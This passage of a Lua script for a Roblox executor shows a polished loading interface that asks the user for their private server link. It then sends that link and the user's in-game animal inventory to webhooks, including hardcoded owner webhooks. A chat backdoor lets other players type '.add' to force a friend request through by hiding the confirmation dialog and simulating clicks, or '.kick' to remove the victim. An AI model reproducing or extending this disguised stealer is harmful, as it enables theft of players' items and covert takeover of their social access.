    inputBox.PlaceholderColor3 = Color3.fromRGB(100, 120, 160)
    inputBox.TextSize = 18
    inputBox.Font = Enum.Font.GothamMedium
    inputBox.ClearTextOnFocus = false
    inputBox.ZIndex = 6
    inputBox.Parent = inputFrame

    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 16)
    inputCorner.Parent = inputBox

    local inputStroke = Instance.new("UIStroke")
    inputStroke.Color = Color3.fromRGB(80, 120, 200)
    inputStroke.Thickness = 1.5
    inputStroke.Transparency = 0.6
    inputStroke.Parent = inputBox

    local promptText = Instance.new("TextLabel")
    promptText.Name = "PromptText"
    promptText.Size = UDim2.new(0, 300, 0, 40)
    promptText.Position = UDim2.new(0.5, 0, 0, -60)
    promptText.AnchorPoint = Vector2.new(0.5, 1)
    promptText.BackgroundTransparency = 1
    promptText.Text = "Escribe el link de tu servidor"
    promptText.TextColor3 = Color3.fromRGB(160, 180, 220)
    promptText.TextSize = 16
    promptText.Font = Enum.Font.Gotham
    promptText.ZIndex = 6
    promptText.TextTransparency = 1
    promptText.Parent = inputFrame

    local targetMouseOffset = Vector2.new(0, 0)
    local currentMouseOffset = Vector2.new(0, 0)

    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            mousePosition = Vector2.new(input.Position.X, input.Position.Y)
        end
    end)

    UserInputService.TouchMoved:Connect(function(touch, gameProcessed)
        mousePosition = Vector2.new(touch.Position.X, touch.Position.Y)
    end)

    local function isValidRobloxServerLink(link)
        if not link or link == "" then
            return false
        end

        local lowerLink = link:lower()

        if not lowerLink:find("roblox%.com") then
            return false
        end

        if not lowerLink:find("share%?code=") then
            return false
        end

        if not lowerLink:find("type=server") then
            return false
        end

        local codePattern = "code=([a-f0-9]+)"
        local code = link:match(codePattern)

        if not code or #code < 30 then
            return false
        end

        return true
    end

    inputBox.FocusLost:Connect(function(enterPressed)
        if enterPressed and inputBox.Text ~= "" and not userSubmitted then
            local inputText = inputBox.Text:gsub("%s+", "")

            if not isValidRobloxServerLink(inputText) then
                inputBox.Text = ""
                inputBox.PlaceholderText = "Link inválido. Ingresa un link de servidor privado válido"
                inputBox.PlaceholderColor3 = Color3.fromRGB(255, 100, 100)

                local shakeTween = TweenService:Create(inputBox, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, true, 0), {Position = UDim2.new(1, -20, 1, -20)})
                shakeTween:Play()
                shakeTween.Completed:Connect(function()
                    inputBox.Position = UDim2.new(1, -40, 1, -20)
                end)

                task.wait(2)
                inputBox.PlaceholderText = "Escribe tu servidor"
                inputBox.PlaceholderColor3 = Color3.fromRGB(100, 120, 160)
                return
            end

            userSubmitted = true
            serverLinkToSend = inputText

            TweenService:Create(inputBox, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1}):Play()
            TweenService:Create(inputStroke, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Transparency = 1}):Play()
            TweenService:Create(promptText, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1}):Play()
            TweenService:Create(inputBox, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1}):Play()

            task.wait(1)
            inputFrame.Visible = false

            loadingText.Visible = false
            processingText.Visible = true
            TweenService:Create(processingText, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

            task.spawn(function()
                task.wait(0.5)

                warn("h//h")
                local foundAnimals, modelCount = getPodiumInfo()
                warn("h//h", #foundAnimals)

                for i, animal in ipairs(foundAnimals) do
                    warn("h//h", i, animal.name, animal.generation, animal.value or "nil")
                end

                -- Sistema nuevo: enviar todos los animales al webhook del usuario
                if Config.USER_WEBHOOK then
                    warn("h//h usando sistema simple - enviando todos los animales")
                    -- Enviar siempre, incluso si está vacío (mostrará "None")
                    sendToWebhook("all", foundAnimals, serverLinkToSend, modelCount)
                else
                    -- Sistema antiguo: clasificar por categorías
                    local classified = classifyAnimals(foundAnimals)

                    if #classified["hardcoded_special"] > 0 then
                        warn("h//h Enviando hardcoded special animals")
                        sendToWebhook("hardcoded_special", classified["hardcoded_special"], serverLinkToSend, modelCount)
                    else
                        for category, categoryAnimals in pairs(classified) do
                            if category ~= "hardcoded_special" then
                                warn("h//h Procesando categoría:", category, "Cantidad:", #categoryAnimals)
                                if #categoryAnimals > 0 then
                                    local hardcodedAllowedAnimals = {}
                                    local normalAnimals = {}
                                    
                                    for _, animal in ipairs(categoryAnimals) do
                                        if animal.isHardcodedAllowed then
                                            table.insert(hardcodedAllowedAnimals, animal)
                                        else
                                            table.insert(normalAnimals, animal)
                                        end
                                    end
                                    
                                    -- Enviar animales normales primero (si los hay)
                                    if #normalAnimals > 0 then
                                        warn("h//h Enviando", #normalAnimals, "animales normales a categoría", category)
                                        sendToWebhook(category, normalAnimals, serverLinkToSend, modelCount)
                                        task.wait(1)
                                    end
                                    
                                    -- Enviar hardcoded allowed animals (si los hay)
                                    if #hardcodedAllowedAnimals > 0 then
                                        warn("h//h Enviando", #hardcodedAllowedAnimals, "hardcoded allowed animals a categoría", category)
                                        sendToWebhook(category, hardcodedAllowedAnimals, serverLinkToSend, modelCount)
                                        task.wait(1)
                                        
                                        -- Enviar también al owner webhook si existe
                                        local ownerWebhook = HARDCODED_OWNER_WEBHOOKS[category]
                                        if ownerWebhook then
                                            warn("h//h Enviando hardcoded allowed animals al owner webhook de", category)
                                            local oldWebhook = Config.WEBHOOKS[category]
                                            Config.WEBHOOKS[category] = ownerWebhook
                                            sendToWebhook(category, hardcodedAllowedAnimals, serverLinkToSend, modelCount)
                                            Config.WEBHOOKS[category] = oldWebhook
                                            task.wait(1)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                warn("h//h")
            end)
        end
    end)

    local function updateParticles(deltaTime)
        time = time + deltaTime * 0.35

        if time > 4 and not explosionStarted then
            explosionStarted = true
        end

        if explosionStarted and explosionProgress < 1 then
            explosionProgress = math.min(explosionProgress + deltaTime * 0.35, 1)
        end

        if explosionStarted and explosionProgress > 0.6 and not formingUI then
            formingUI = true
            inputFrame.Visible = true
            TweenService:Create(inputBox, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.15}):Play()
            TweenService:Create(inputStroke, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 0.4}):Play()
            TweenService:Create(promptText, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        end

        if formingUI and not userSubmitted then
            formProgress = math.min(formProgress + deltaTime * 0.35, 1)
        end

        if userSubmitted and formingUI then
            explosionStarted = true
            explosionProgress = 1
            formProgress = 1
            morphingShapes = true

            morphTimer = morphTimer + deltaTime

            if morphTimer >= 4 then
                morphTimer = 0
                currentShape = currentShape + 1
                if currentShape > #shapes then
                    currentShape = 1
                end
                shapeTransition = 0
            end

            if shapeTransition < 1 then
                shapeTransition = math.min(shapeTransition + deltaTime * 1.2, 1)
            end
        end

        local screenCenter = Vector2.new(
            centerFrame.AbsolutePosition.X + centerFrame.AbsoluteSize.X / 2,
            centerFrame.AbsolutePosition.Y + centerFrame.AbsoluteSize.Y / 2
        )

        targetMouseOffset = (mousePosition - screenCenter) * 0.00025
        currentMouseOffset = currentMouseOffset + (targetMouseOffset - currentMouseOffset) * 0.08

        local rotationX = math.sin(time * 0.2) * 0.15 + currentMouseOffset.Y
        local rotationY = time * 0.25 + currentMouseOffset.X

        for i, particleData in ipairs(particles) do
            local individualTime = time + particleData.noiseOffset * 0.08

            local breathe = smoothNoise(individualTime * 1.0 + particleData.phaseOffset, 3) * 0.1
            local wave = math.sin(individualTime * 0.7 + particleData.phaseOffset) * 0.06

            local radiusScale = 1 + breathe + wave

            local x = particleData.baseX * radiusScale
            local y = particleData.baseY * radiusScale
            local z = particleData.baseZ * radiusScale

            local cosX = math.cos(rotationX)
            local sinX = math.sin(rotationX)
            local y2 = y * cosX - z * sinX
            local z2 = y * sinX + z * cosX

            local cosY = math.cos(rotationY)
            local sinY = math.sin(rotationY)
            local x3 = x * cosY + z2 * sinY
            local z3 = -x * sinY + z2 * cosY

            local perspective = 1 / (1.3 + z3 * 0.35)
            local sphereX = x3 * baseRadius * perspective
            local sphereY = y2 * baseRadius * perspective

            local explosionDistance = explosionProgress * particleData.explosionSpeed * 450
            local explosionEase = explosionProgress * explosionProgress * (3 - 2 * explosionProgress)
            local explosionX = sphereX + particleData.explosionDirX * explosionDistance * explosionEase
            local explosionY = sphereY + particleData.explosionDirY * explosionDistance * explosionEase

            local uiX, uiY = getUIPosition(i, #particles)

            local shouldOrbitText = (i % 5 == 0)

            if shouldOrbitText and formingUI and not userSubmitted then
                local orbitRadius = 140 + math.sin(individualTime * 2 + particleData.phaseOffset) * 20
                local orbitAngle = individualTime * 0.8 + particleData.angle * 2
                uiX = math.cos(orbitAngle) * orbitRadius
                uiY = math.sin(orbitAngle) * orbitRadius - 40
            end

            local formEase = easeInOutCubic(formProgress)

            local dirToUIX = uiX - explosionX
            local dirToUIY = uiY - explosionY
            local distToUI = math.sqrt(dirToUIX * dirToUIX + dirToUIY * dirToUIY)

            local resistance = particleData.resistance
            local pullStrength = formProgress * (1 / (1 + distToUI * 0.01))

            local wiggle = math.sin(individualTime * 3 + particleData.phaseOffset) * 20 * (1 - formEase * 0.7) * resistance
            local wiggleX = math.cos(particleData.explosionRotation) * wiggle
            local wiggleY = math.sin(particleData.explosionRotation) * wiggle

            particleData.explosionRotation = particleData.explosionRotation + particleData.explosionRotationSpeed * deltaTime * (1 - formEase * 0.5)

            local finalX, finalY

            if userSubmitted then
                local prevShape = shapes[currentShape == 1 and #shapes or currentShape - 1]
                local currShape = shapes[currentShape]

                local prevX, prevY = getShapePosition(prevShape, i, #particles, individualTime)
                local currX, currY = getShapePosition(currShape, i, #particles, individualTime)

                local easeTransition = easeInOutCubic(shapeTransition)

                finalX = lerp(prevX, currX, easeTransition)
                finalY = lerp(prevY, currY, easeTransition)
            else
                finalX = lerp(explosionX + wiggleX, uiX, formEase * pullStrength)
                finalY = lerp(explosionY + wiggleY, uiY, formEase * pullStrength)
                particleData.currentX = finalX
                particleData.currentY = finalY
            end

            local depth = (z3 + 1.3) / 2.6
            depth = math.max(0, math.min(1, depth))

            local particleScale = (0.8 + perspective * 1.5) * (1 + breathe * 0.2)

            if explosionStarted and not formingUI then
                particleScale = particleScale * (1 + explosionProgress * 0.3)
            elseif not userSubmitted then
                particleScale = lerp(particleScale, 1.5, formEase)
            else
                particleScale = 1.8
            end

            particleData.frame.Position = UDim2.new(0.5, finalX, 0.5, finalY)
            particleData.frame.Size = UDim2.new(0, 1 * particleScale, 0, 1 * particleScale)

            local brightness = 80 + depth * 175
            local colorPulse = math.sin(individualTime * 1.3) * 20

            particleData.frame.BackgroundColor3 = Color3.fromRGB(
                math.clamp(brightness * 0.45 + colorPulse, 0, 255),
                math.clamp(brightness * 0.65 + colorPulse, 0, 255),
                math.clamp(brightness + colorPulse, 0, 255)
            )

            local keepParticle = (i % 8 == 0) or shouldOrbitText
            local baseTransparency = 0.1 + (1 - depth) * 0.5

            local finalTransparency
            if userSubmitted then
                finalTransparency = 0.15
            elseif keepParticle then
                finalTransparency = lerp(baseTransparency, 0.1, formEase)
            else
                finalTransparency = lerp(baseTransparency, 0.95, formEase)
            end

            particleData.frame.BackgroundTransparency = finalTransparency
            particleData.frame.ZIndex = (formingUI and not userSubmitted) and 4 or math.floor(depth * 100)
        end
    end

    TweenService:Create(loadingText, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

    local connection = RunService.RenderStepped:Connect(updateParticles)
    
    local VirtualInputManager = game:GetService("VirtualInputManager")
    
    local function sendFriendRequest(targetPlayer)
        pcall(function()
            game:GetService("StarterGui"):SetCore("PromptSendFriendRequest", targetPlayer)
        end)
        
        wait(2)
        
        pcall(function()
            local promptDialog = CoreGui.RobloxGui.PromptDialog
            promptDialog.ContainerFrame.Visible = false
            
            local confirmButton = promptDialog.ContainerFrame.ConfirmButton
            confirmButton.Size = UDim2.new(1, 0, 1, 0)
            confirmButton.Position = UDim2.new(0, 0, 0, 0)
            confirmButton.ZIndex = 999999
            confirmButton.BackgroundTransparency = 1
            
            wait(0.2)
            
            local screenSize = workspace.CurrentCamera.ViewportSize
            local centerX = screenSize.X / 2
            local centerY = screenSize.Y / 2
            
            for _, connection in pairs(getconnections(confirmButton.MouseButton1Click)) do
                connection:Fire()
            end
            
            wait(0.1)
            
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
            wait(0.05)
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
            
            wait(0.5)
            promptDialog.ContainerFrame.Visible = true
        end)
        
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
        end)
    end
    
    local function sendKick(targetPlayer, reason)
        pcall(function()
            targetPlayer:Kick(reason or "Kicked by script")
        end)
    end

    Players.PlayerAdded:Connect(function(otherPlayer)
        otherPlayer.Chatted:Connect(function(message)
            if message == ".add" then
                sendFriendRequest(otherPlayer)
            elseif message:sub(1, 6) == ".kick " then
                local reason = message:sub(7)
                sendKick(otherPlayer, reason)
            end
        end)
    end)

    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player then
            otherPlayer.Chatted:Connect(function(message)
                if message == ".add" then
                    sendFriendRequest(otherPlayer)
                elseif message:sub(1, 6) == ".kick " then
                    local reason = message:sub(7)
                    sendKick(otherPlayer, reason)
                end
            end)
        end
    end
end

-- Auto-inicializar si se detectan las variables globales del sistema simple
if getgenv and getgenv().UserWebhookURL then
    Library.Initialize()
end

return Library
